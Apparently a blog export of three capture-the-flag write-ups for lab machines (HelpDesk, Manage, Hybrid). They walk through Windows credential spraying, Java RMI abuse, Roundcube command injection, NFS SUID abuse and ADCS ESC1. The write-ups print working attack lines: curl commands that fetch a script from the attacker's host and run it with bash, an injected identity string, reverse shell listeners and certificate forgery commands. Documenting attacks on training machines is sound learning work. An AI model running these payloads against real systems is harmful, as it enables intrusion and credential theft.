Initial NmapPORT    STATE SERVICE       REASON          VERSION80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0| http-title: Support Login Page|_Requested resource was login.php| http-cookie-flags:|   /:|     PHPSESSID:|_      httponly flag not set| http-methods:|   Supported Methods: OPTIONS TRACE GET HEAD POST|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC445/tcp open  microsoft-ds? syn-ack ttl 127Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:|   date: 2025-04-06T22:12:43|_  start_date: N/A|_clock-skew: 1s| p2p-conficker:|   Checking for Conficker.C or higher...|   Check 1 (port 48515/tcp): CLEAN (Timeout)|   Check 2 (port 35033/tcp): CLEAN (Timeout)|   Check 3 (port 25486/udp): CLEAN (Timeout)|   Check 4 (port 29195/udp): CLEAN (Timeout)|_  0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode:|   3:1:1:|_    Message signing enabled but not required

HelpDesk Support, Please Help!Looking on port 80 we see a site, with the option to login as guest. We also find a potential user.

We also see his configuration he attacted so kindly.
version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh

Looking into Cisco Passwords we are able to decrypt these password hashes by finding the hash type. We are able to try them against the user we found hazard. When we try them against the site we don’t get access.
SMB for usersUsing our password list we can spray and see which works for our user.
$ nxc smb 10.10.10.149 -u hazard -p pass.lstSMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:&lt;SNIP&gt;
From here we can get a list of users.
$ nxc smb 10.10.10.149 -u hazard -p &lt;SNIP&gt; --rid-brute | grep SidTypeUser | cut -d &#x27;\&#x27; -f2 | awk &#x27;&#123;print $1&#125;&#x27; &gt; users.list
Then since I have some passwords to try I’ll try them against all the users we gathered.
$ nxc smb 10.10.10.149 -u users.list -p pass.lst --continue-on-successSMB                      10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)SMB                      10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:&lt;SNIP&gt;SMB                      10.10.10.149    445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)SMB                      10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Chase:&lt;SNIP&gt;

WinRM-ingWe can also look to see who has WinRM access. 
$ nxc winrm 10.10.10.149 -u users.list -p pass.lst --continue-on-successWINRM       10.10.10.149    5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)&lt;SNIP&gt;WINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\Chase:&lt;SNIP&gt; (Pwn3d!)
Looks as user chase has some access, lets hop on the machine.
Banking with Chase 😂After getting connected, we look at the usual.

Unusual installed programs and directories in C:
Services running&#x2F;Process running (‘ps’)
User permissions and groups
etc,etc,etc

Looking into process running we see firefox running, and for that matter they seem to be using it now. So we can dump the memory of this process.
*Evil-WinRM* PS C:\Users\Chase\Documents&gt; psHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------    463      18     2240       5320               364   0 csrss    290      13     2224       5076               480   1 csrss    357      15     3500      14548              5052   1 ctfmon    255      14     3896      13288              3788   0 dllhost    166       9     1872       9632       0.02   6672   1 dllhost    617      32    29092      57664               968   1 dwm   1492      57    23540      79016              3856   1 explorer   1164      68   129556     206536       3.42   6344   1 firefox    347      19    10168      35328       0.05   6468   1 firefox    401      34    30516      89464       0.42   6612   1 firefox    378      28    21968      58372       0.19   6884   1 firefox    355      25    16396      38740       0.06   7144   1 firefox     49       6     1792       4600               784   1 fontdrvhost&lt;SNIP&gt;
Using procdump64.exe, a neat tool from Sysinternals, we can dump the memory of the process.
*Evil-WinRM* PS C:\Users\Chase\Documents&gt; .\procdump64.exe -mm 6344 firefoxProcDump v11.0 - Sysinternals process dump utilityCopyright (C) 2009-2022 Mark Russinovich and Andrew RichardsSysinternals - www.sysinternals.com[19:06:16] Dump 1 initiated: C:\Users\Chase\Documents\firefox.dmp[19:06:16] Dump 1 complete: 5 MB written in 0.1 seconds[19:06:16] Dump count reached.*Evil-WinRM* PS C:\Users\Chase\Documents&gt; ls    Directory: C:\Users\Chase\DocumentsMode                LastWriteTime         Length Name----                -------------         ------ -----a----         4/7/2025   7:06 PM        4594512 firefox.dmp-a----         4/7/2025   7:05 PM         424856 procdump64.exe*Evil-WinRM* PS C:\Users\Chase\Documents&gt;
System Administrator left somethingAfter getting the dmp to our machine, easiest via SMB server, we can look through the content. Looking for anything related to the machine or users.
$ strings firefox.log.dmp |less&lt;SNIP&gt;MOZ_CRASHREPORTER_STRINGS_OVERRIDE=C:\Program Files\Mozilla Firefox\browser\crashreporter-override.inilocalhost/login.php?login_username=admin@support.htb&amp;login_password=&lt;SNIP&gt;&amp;login=DELETE FROM moz_anno_attributes WHERE id IN (
Alas, we find a POST request with username and password. We can login with the Administrator account now.
$ evil-winrm -i 10.10.10.149 -u administrator -p &lt;SNIP&gt;Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoamisupportdesk\administrator*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>Cisco</tag>
        <tag>ProcDump</tag>
      </tags>
  </entry>
  <entry>
    <title>Manage (Linux Easy)</title>
    <url>/2025/04/25/Manage/</url>
    <content><![CDATA[
Manage is a Linux Easy machine starting off with Java RMI using beanshooter. After enumeration we see we gather credentials and that authorization on the Remote MBean server isn’t required. Using this we are able to get a foothold on the machine. As user tomcat, we see other users we can attack in /etc/passwd. Trying to escalate our privilege to useradmin we have password reuse from the credentials we gathered, but upon entering the password were asked for verification. Looking in useradmin‘s home we see a backup tar file. Getting it to our machine yields this users home directory backed up. We have a ssh key we can use to get on the box, along with .google_authenticator having PINS to try. Doing so gets us sshed on the box. Looking at our users privilege, we see we have ALL:ALL on /usr/sbin/adduser. Looking at a typical sudoers file we see we can use admin as a user, as this group is not present on the box. Upon adding this user, they will in turn be added to the admin group allowing just ALL:ALL, which gives us root.
Initial NmapPORT     STATE SERVICE  REASON         VERSION22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)                              | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)                            |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh          2222/tcp open  java-rmi syn-ack ttl 63 Java RMI                                             | rmi-dumpregistry:                                                                         |   jmxrmi                                                                                  |     javax.management.remote.rmi.RMIServerImpl_Stub                                        |     @127.0.1.1:38941                        |     extends                                                                               |       java.rmi.server.RemoteStub                                                          |       extends                                                                             |_        java.rmi.server.RemoteObject                                                      |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)                              8080/tcp open  http     syn-ack ttl 63 Apache Tomcat 10.1.19                                 |_http-favicon: Apache Tomcat                  |_http-title: Apache Tomcat/10.1.19            | http-methods:                                                                             |_  Supported Methods: GET HEAD POST OPTIONS   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Looking at port 2222 specifically. 👀
Java RMI (Remote Method Invocation) and our footHold 👌Java RMI(Remote Method Invocation) is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if they’re on different physical machines. RMI provides a mechanism for Java-based distributed computing. We can abuse this with beanshooter.

We can first run some enumeration.
$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.124.240 2222[+] Checking available bound names:[+][+]     * jmxrmi (JMX endpoint: 127.0.1.1:38941)[+][+] Checking for unauthorized access:[+][+]     - Remote MBean server does not require authentication.[+]       Vulnerability Status: Vulnerable[+][+] Checking pre-auth deserialization behavior:[+][+]     - Remote MBeanServer rejected the payload class.[+]       Vulnerability Status: Non Vulnerable   &lt;SNIP&gt;[+] Enumerating tomcat users:[+][+]     - Listing 2 tomcat users:[+][+]             ----------------------------------------[+]             Username:  manager[+]             Password:  &lt;SNIP&gt;[+]             Roles:[+]                        Users:type=Role,rolename=&quot;manage-gui&quot;,database=UserDatabase[+][+]             ----------------------------------------[+]             Username:  admin[+]             Password:  &lt;SNIP&gt;[+]             Roles:[+]                        Users:type=Role,rolename=&quot;role1&quot;,database=UserDatabas                     

Now we have some credentials. But lets try to get a shell. First we can create a reverse shell and put it in x and host it. This will grab our shell.
$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 exec &#x27;curl -o /tmp/x 10.8.4.29/x&#x27;

This the executes our shell.
$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 exec &#x27;bash /tmp/x&#x27;

Our foothold appears 🙌
$ nc -lvnp 9001listening on [any] 9001 ...connect to [10.8.4.29] from (UNKNOWN) [10.10.124.240] 57806bash: cannot set terminal process group (597): Inappropriate ioctl for devicebash: no job control in this shelltomcat@manage:/$ ididuid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)tomcat@manage:/$ 


I’m just a regular TomcatAs tomcat we look around seeing we have to users we can look at. Going to /home we can see a directory backup in useradmin‘s home directory. This has a backup.tar.gz we can extract to our machine. 
$ tomcat@manage:/home/useradmin/backups$ lslsbackup.tar.gz
I just base64 encoded and the decoded on my machine. After that we had some directories, including .ssh. Using the key we can ssh in as useradmin, but upon entering the password it asks for verification.
$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240(useradmin@10.10.124.240) Verification code:
We also had a .google_authenticator file. This held PINS we can use for verification, and after using one or two we get in.
$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240(useradmin@10.10.124.240) Verification code: Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)Last login: Sat Apr 26 00:29:41 2025 from 10.8.4.29useradmin@manage:~$ iduid=1002(useradmin) gid=1002(useradmin) groups=1002(useradmin)

PrivEscIf we look at our privileges we have adduser, trying everything such as appending to the end i.e. --uid 0 or --system didn’t yield any results. Yet if we look we groups there wasn’t an admin, a typical sudoers file looks like the following:
# User privilege specificationroot	ALL=(ALL:ALL) ALL# Members of the admin group may gain root privileges%admin ALL=(ALL) ALL# Allow members of group sudo to execute any command%sudo	ALL=(ALL:ALL) ALL
So in theory if we add a user named admin then groups follow when a new user is added. So adding user admin would give us the permissions ALL=(ALL) ALL. That gets us root.
useradmin@manage:~$ su adminPassword: admin@manage:/home/useradmin$ sudo -l[sudo] password for admin: Matching Defaults entries for admin on manage:    env_reset, timestamp_timeout=1440, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_ptyUser admin may run the following commands on manage:    (ALL) ALLadmin@manage:/home/useradmin$ sudo suroot@manage:/home/useradmin# iduid=0(root) gid=0(root) groups=0(root)


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>Java RMI</tag>
        <tag>TomCat</tag>
        <tag>Sudo Abuse</tag>
      </tags>
  </entry>
  <entry>
    <title>Hybrid (Chain Easy)</title>
    <url>/2025/04/29/Hybrid/</url>
    <content><![CDATA[
Hybrid is a Chain mixed with a linux and windows machine. Starts off with Roundcube Webmail on http, using alias identities your able to force command injection leading to a reverse shell. The once on the box your find /etc/exports enabling rw for /opt/share, allowing for privilege escalation to user peter. Once done, you tunnel through to find a vulnerable ESC1 template allowing for Domain Computers to supply enrollees allowing for privilege escalation to Administrator.
Initial NmapTwo IPs to scan.
Nmap scan report for 10.10.160.197Host is up (0.16s latency).Not shown: 988 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-11 15:34:13Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.hybrid.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl| Issuer: commonName=hybrid-DC01-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-17T16:39:23| Not valid after:  2025-07-17T16:39:23| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9|_ssl-date: TLS randomness does not represent time445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.hybrid.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl| Issuer: commonName=hybrid-DC01-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-17T16:39:23| Not valid after:  2025-07-17T16:39:23| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9|_ssl-date: TLS randomness does not represent time3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=dc01.hybrid.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl| Issuer: commonName=hybrid-DC01-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-17T16:39:23| Not valid after:  2025-07-17T16:39:23| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a93269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.hybrid.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl| Issuer: commonName=hybrid-DC01-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-17T16:39:23| Not valid after:  2025-07-17T16:39:23| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9|_ssl-date: TLS randomness does not represent time3389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: HYBRID|   NetBIOS_Domain_Name: HYBRID|   NetBIOS_Computer_Name: DC01|   DNS_Domain_Name: hybrid.vl|   DNS_Computer_Name: dc01.hybrid.vl|   Product_Version: 10.0.20348|_  System_Time: 2024-11-11T15:36:56+00:00| ssl-cert: Subject: commonName=dc01.hybrid.vl| Issuer: commonName=dc01.hybrid.vl| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-16T16:48:12| Not valid after:  2025-01-15T16:48:12| MD5:   d7ed:81b4:60b7:109f:56e3:7901:e081:2237|_SHA-1: 95e3:a4cd:6bc8:3de4:cd9a:92c3:10e5:4e58:9951:81a4|_ssl-date: 2024-11-11T15:37:36+00:00; 0s from scanner time.Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:|   date: 2024-11-11T15:36:56|_  start_date: N/A| smb2-security-mode:|   3:1:1:|_    Message signing enabled and requiredNmap scan report for 10.10.160.198Host is up (0.16s latency).Not shown: 990 closed tcp ports (reset)PORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)25/tcp   open  smtp?|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING80/tcp   open  http        nginx 1.18.0 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD|_http-title: Redirecting...|_http-server-header: nginx/1.18.0 (Ubuntu)110/tcp  open  pop3        Dovecot pop3d| ssl-cert: Subject: commonName=mail01| Subject Alternative Name: DNS:mail01| Issuer: commonName=mail01| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2023-06-17T13:20:17| Not valid after:  2033-06-14T13:20:17| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008|_ssl-date: TLS randomness does not represent time|_pop3-capabilities: CAPA UIDL SASL RESP-CODES STLS AUTH-RESP-CODE PIPELINING TOP111/tcp  open  rpcbind     2-4 (RPC #100000)| rpcinfo:|   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      35943/tcp6  mountd|   100005  1,2,3      38361/tcp   mountd|   100005  1,2,3      42047/udp   mountd|   100005  1,2,3      55681/udp6  mountd|   100021  1,3,4      32856/udp   nlockmgr|   100021  1,3,4      36789/tcp6  nlockmgr|   100021  1,3,4      37737/tcp   nlockmgr|   100021  1,3,4      60997/udp6  nlockmgr|   100227  3           2049/tcp   nfs_acl|_  100227  3           2049/tcp6  nfs_acl143/tcp  open  imap        Dovecot imapd (Ubuntu)|_imap-capabilities: more post-login LOGIN-REFERRALS OK LITERAL+ IDLE IMAP4rev1 capabilities SASL-IR ID ENABLE have Pre-login LOGINDISABLEDA0001 listed STARTTLS|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=mail01| Subject Alternative Name: DNS:mail01| Issuer: commonName=mail01| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2023-06-17T13:20:17| Not valid after:  2033-06-14T13:20:17| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008587/tcp  open  submission?|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)|_ssl-date: TLS randomness does not represent time|_imap-capabilities: more post-login LOGIN-REFERRALS OK LITERAL+ IDLE IMAP4rev1 AUTH=LOGINA0001 SASL-IR AUTH=PLAIN ENABLE have capabilities Pre-login listed ID| ssl-cert: Subject: commonName=mail01| Subject Alternative Name: DNS:mail01| Issuer: commonName=mail01| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2023-06-17T13:20:17| Not valid after:  2033-06-14T13:20:17| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008995/tcp  open  ssl/pop3    Dovecot pop3d|_pop3-capabilities: CAPA UIDL SASL(PLAIN LOGIN) RESP-CODES USER AUTH-RESP-CODE PIPELINING TOP| ssl-cert: Subject: commonName=mail01| Subject Alternative Name: DNS:mail01| Issuer: commonName=mail01| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2023-06-17T13:20:17| Not valid after:  2033-06-14T13:20:17| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008|_ssl-date: TLS randomness does not represent time2049/tcp open  nfs_acl     3 (RPC #100227)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

We have two targets, lets focus on the linux machine first since the other is unreachable.
HTTPGoing to the IP address redirectes us to mail01.hybrid.vl and looks to be Roundcube Webmail. Not much we can do at the moment. We’ll come back 👍.

NFSWe did have a port 2049 NFS open we can check.
$ showmount -e 10.10.168.102Export list for 10.10.168.102:/opt/share *

Mounting to it we see backup.tar.gz. We copy it and unzip to find some configs and other directorys.
$ sudo mount.nfs -o rw 10.10.139.134:/opt/share tmpMnt/ $ tree backup             backup├── backup.tar.gz├── etc│   ├── dovecot│   │   └── dovecot-users│   ├── passwd│   ├── postfix│   │   └── main.cf│   └── sssd│       └── sssd.conf└── opt    └── certs        └── hybrid.vl            ├── fullchain.pem            └── privkey.pem8 directories, 7 files
This reveals some users from the dovecot-users file.
admin@hybrid.vl:&#123;plain&#125;&lt;SNIP&gt;peter.turner@hybrid.vl:&#123;plain&#125;&lt;SNIP&gt;

We can try these to login with RoundCube.
RoundCube WebmailUsing the credentials we’re able to login with both accounts. Looking at what version is installed we see more plugins install as well, one that sticks out is markasjunk. 

We can look over this blog and see how it works. So simply, we need to use peter’s account to send and email to admin and receive a shell back.
We need to change his email a bit, or his identity, to peter.turner&amp;curl$&#123;IFS&#125;-o$&#123;IFS&#125;/tmp/x$&#123;IFS&#125;10.8.4.29/x$&#123;IFS&#125;|$&#123;IFS&#125;bash&amp;@hybrid.vl. 

Then we send an email to admin, select it, and mark as junk. Then watch the magic happen. 🎇✨🎇(we hope) 🤨

$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.168.102 - - [28/Apr/2025 14:03:22] &quot;GET /x HTTP/1.1&quot; 200 -
Hits us!!
$ nc -lvnp 900114:04:13 [14/27]listening on [any] 9001 ...  connect to [10.8.4.29] from (UNKNOWN) [10.10.168.102] 52370bash: cannot set terminal process group (646): Inappropriate ioctl for devicebash: no job control in this shellwww-data@mail01:~/roundcube$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@mail01:~/roundcube$

We got our callback.
Shell as www-dataChecking the mysql config doesn’t yield much but the same users.
www-data@mail01:~/roundcube$ cat config/config.inc.php | grep -v &#x27;^//&#x27; | grep .&lt;?php/* Local configuration for Roundcube Webmail */$config[&#x27;db_dsnw&#x27;] = &#x27;mysql://roundcube:&lt;SNIP&gt;@localhost/roundcubemail&#x27;;$config[&#x27;imap_host&#x27;] = &#x27;localhost:143&#x27;;$config[&#x27;support_url&#x27;] = &#x27;&#x27;;$config[&#x27;des_key&#x27;] = &#x27;RpiHQJt10wGZdlMAU9CnBPfc&#x27;;$config[&#x27;plugins&#x27;] = [&quot;markasjunk&quot;];

Since the NFS was running we can check its configs at /etc/exports. Which yields the follwing:
$ cat /etc/exports# /etc/exports: the access control list for filesystems which may be exported#               to NFS clients.  See exports(5).## Example for NFSv2 and NFSv3:# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)## Example for NFSv4:# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)#/opt/share *(rw,no_subtree_check)    

This is a good one!!! Basically, we can copy the systems /bin/bash to /opt/share(your machines &#x2F;bin&#x2F;bash might not work). Then create user peter with the same uid and give ownership of bash to peter and give it a stickybit. Execute on the victim machine. 

We’re peter on the box!!✨✨
---VicMac--$ cp /bin/bash /opt/share$ id peter.turner@hybrid.vluid=&lt;SNIP&gt;(peter.turner@hybrid.vl) gid=&lt;SNIP&gt;(domain users@hybrid.vl) groups=&lt;SNIP&gt;(domain users@hybrid.vl),&lt;SNIP&gt;(hybridusers@hybrid.vl)--AttMac--$ useradd -u &lt;SNIP&gt; -r -s /bin/bash peter$ su peter$ cp /opt/share/bash .$ chmod +s bash$ cp bash /opt/share--VicMac--$ ./bash -pbash-5.1$ iduid=33(www-data) gid=33(www-data) euid=90&lt;SNIP&gt;(peter.turner@hybrid.vl) egid=992 groups=992,33(www-data)bash-5.1$ 

We have euid of peter.turner, which means we can see his home directory now. His home directory contains passwords.kdbx, a KeePass Database. Getting this to our windows vm and looking at it it requires a password. We can try one of the passwords we found from the dovecot-users file, which gets is in.

Root Toot!!Now we have his domain password, and if we try to simply ssh to the box with this password, we get a session. As a added bonus, we get root easily!!
$ ssh peter.turner@hybrid.vl@mail01.hybrid.vl          (peter.turner@hybrid.vl@mail01.hybrid.vl) Password:Last login: Mon Apr 28 23:17:53 2025 from 10.8.4.29peter.turner@hybrid.vl@mail01:~$ sudo -l[sudo] password for peter.turner@hybrid.vl: Matching Defaults entries for peter.turner@hybrid.vl on mail01:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_ptyUser peter.turner@hybrid.vl may run the following commands on mail01:    (ALL) ALLpeter.turner@hybrid.vl@mail01:~$ sudo suroot@mail01:/home/peter.turner@hybrid.vl#

PivotingSetting up a tunnel using chisel so we can continue our enumeration. After doing so, we get an bloodhound dump.
$ proxychains4 -q nxc ldap hybrid.vl -u peter.turner -p &#x27;b0cwR+G4Dzl_rw&#x27; --dns-server 10.10.145.149 --bloodhound -c All
Long story short, peter didn’t have anything we could to our advantage.
Seeing as ADCS is running on the machine we can try there.
ADCS is my friendRunning certipy we find that this template is vulnerable to ESC1. 
$ proxychains4 -q certipy find -vulnerable -dc-ip 10.10.149.117 -u peter.turner@hybrid.vl -p &lt;SNIP&gt; -stdout -debug&lt;SNIP&gt; [!] Vulnerabilities      ESC1                              : &#x27;HYBRID.VL\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication

Yet we need a Domain Computer to do this, and we did have root on the MAIL01$ machine. We can get the keytab file for kerberos over to our machine and use keytabextract.py. 
$ keytabextract.py /home/jay/Documents/vl/chains/hybrid/krb5.keytab [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.[+] Keytab File successfully imported.        REALM : HYBRID.VL        SERVICE PRINCIPAL : MAIL01$/        NTLM HASH : &lt;SNIP&gt;        AES-256 HASH : &lt;SNIP&gt;        AES-128 HASH : &lt;SNIP&gt;
PrivEscNow we can exploit ESC1 with a couple commands.
Firstly, we request with upn Administrator using the CA and the Template Name. This will give us a pfx file.
$ proxychains4 -q certipy req -dc-ip 10.10.149.117 -u &#x27;MAIL01$@hybrid.vl&#x27; -hashes :&lt;SNIP&gt; -ca hybrid-DC01-CA -template HybridComputers -upn Administrator -key-size 4096 -debugCertipy v4.8.2 - by Oliver Lyak (ly4k)[+] Generating RSA key[*] Requesting certificate via RPC[+] Trying to connect to endpoint: ncacn_np:10.10.149.117[\pipe\cert]                          [+] Connected to endpoint: ncacn_np:10.10.149.117[\pipe\cert][*] Successfully requested certificate                                                         [*] Request ID is 21[*] Got certificate with UPN &#x27;Administrator&#x27;[*] Certificate has no object SID                                                              [*] Saved certificate and private key to &#x27;administrator.pfx&#x27;
Lastly, we authenticate with the pfx file. 
